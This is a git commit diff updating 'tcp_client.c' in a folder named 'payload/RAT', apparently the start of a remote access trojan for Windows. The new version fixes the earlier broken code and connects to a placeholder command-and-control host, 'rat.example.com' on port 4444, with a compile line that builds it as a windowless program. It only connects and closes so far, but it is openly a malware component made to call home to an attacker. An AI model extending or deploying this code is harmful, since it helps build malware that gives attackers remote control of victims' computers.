9afcafa63171608bd222fcfe75a05d293fabd32b
will-the-creator <hoopa05.cascade@icloud.com>
2025-07-22 15:22:55 -0600

    update tcpclient

--- payload/RAT/tcp_client.c
+++ payload/RAT/tcp_client.c
@@ -1,45 +1,61 @@
 #include <winsock2.h>
+#include <ws2tcpip.h>  // for getaddrinfo
 #include <windows.h>
+#include <stdio.h>
 #pragma comment(lib, "ws2_32.lib")
 
 int main() {
-	WSADATA wsa;
-	SOCKET s;
-	struct sockaddr_in server;
-	char buffer[1024];
-	int recv_size;
+    WSADATA wsa;
+    SOCKET s;
+    struct addrinfo hints, *result = NULL;
+    int ret;
 
-	const char* domain = "rat.example.com"; // !!!!!! change this 
-	const char* port = "4444";
+    const char* domain = "rat.example.com"; // !!!!! change this
+    const char* port = "4444";
 
-	WSAStartup(MAKEWORD(2, 2), *wsa); //start winsock
-	hints.ai_family = AF_INET;    //IPv4
-	hints.ai_socktype  = SOCK_STREAM  //tcp
+    // create winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        printf("WSAStartup failed.\n");
+        return 1;
+    }
 
-	ret = getaddrinfo(domain, port, &hints, &result);
-	if (ret !=0){
-		WSACleanup();
-		return 0;
-	}
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;        //ipv4
+    hints.ai_socktype = SOCK_STREAM;  //tcp
 
-	//create socket
-	s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
-	if (s == INVALID_SOCKET) {
-		WSACleanup();
-		return 0;
-	}
-	//connect
-	con = connect(s, result->ai_addr, (int)result->ai_addrlen);
-	if (con == SOCKEY_ERROR) {
-		closesocket(s);
-		WSACleanup();
-		return 0;
-	}
+    ret = getaddrinfo(domain, port, &hints, &result);
+    if (ret != 0) {
+        printf("getaddrinfo failed: %d\n", ret);
+        WSACleanup();
+        return 1;
+    }
 
-	freeaddrinfo(result);
-	closesocket(s);
-	WSACleanup();
-	return 0;
+    // create socket
+    s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+    if (s == INVALID_SOCKET) {
+        printf("Socket creation failed: %ld\n", WSAGetLastError());
+        freeaddrinfo(result);
+        WSACleanup();
+        return 1;
+    }
 
+    // Connect to c2
+    ret = connect(s, result->ai_addr, (int)result->ai_addrlen);
+    if (ret == SOCKET_ERROR) {
+        printf("Connect failed: %ld\n", WSAGetLastError());
+        closesocket(s);
+        freeaddrinfo(result);
+        WSACleanup();
+        return 1;
+    }
+
+    printf("Connected to %s:%s\n", domain, port);
+
+    freeaddrinfo(result);
+    closesocket(s);
+    WSACleanup();
+
+    return 0;
 }
+
 // compile: cl /O2 /SUBSYSTEM:WINDOWS yourprogram.c ws2_32.lib
